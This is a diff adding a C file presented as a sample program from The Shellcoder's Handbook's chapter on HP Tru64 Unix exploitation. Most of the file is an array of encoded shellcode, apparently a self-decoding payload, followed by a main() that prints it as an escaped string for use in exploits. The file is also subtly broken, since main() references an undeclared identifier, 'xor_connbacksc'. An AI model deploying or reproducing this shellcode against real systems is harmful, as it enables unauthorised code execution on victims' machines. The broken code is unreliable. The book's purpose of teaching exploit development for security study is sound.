@@ -1,0 +1,72 @@
+/*
+
+The Shellcoder's Handbook: Discovering and Exploiting Security Holes
+Jack Koziol, David Litchfield, Dave Aitel, Chris Anley, 
+Sinan Eren, Neel Mehta, Riley Hassell
+Publisher: John Wiley & Sons
+ISBN: 0764544683
+
+Chapter 13: HP Tru64 Unix Exploitation
+Sample Program #7
+
+Please send comments/feedback to jack@infosecinstitute.com or visit http://www.infosecinstitute.com 
+
+*/
+
+
+unsigned int shellcode[] = 
+{
+0x221efc18,
+0x42061412,
+0x47f0d411,
+0xb230fffc,
+0xb232fffc,
+0xd21ffffb,
+0x420e1415,
+0x42069414,
+0x43e79413,
+0xa235fffc,
+0x42061410,
+0xa254fffc,
+0x42609533,
+0x46510812,
+0xb254fffc,
+0x42809414,
+0xf67ffffa,
+0x41414141,
+0xcf497996,
+0xca8e9c85,
+0x3d368888,
+0xcb6a7c88,
+0x3f768880,
+0xcf778c98,
+0x8888880b,
+0xcf568c99,
+0xcd258c98,
+0xcf778c9a,
+0xcb6ffc88,
+0x8888880b,
+0xe1eaa7a7,
+0xe0fba7e6,
+0x88888888,
+0x88888888
+};
+
+
+int
+main()
+{
+     unsigned char buf[sizeof(shellcode)+1];
+     int i;
+     
+     printf("sizeof shellcode %d\n", sizeof(xor_connbacksc));
+     memcpy(buf, shellcode, sizeof(shellcode));
+
+     for(i =0 ; i < sizeof(shellcode); i++) {
+          if( !((i) % 4))
+               printf("\"\n\"");
+          printf("\\x%.2x", buf[i]);
+     }
+     printf("\n");
+}
+
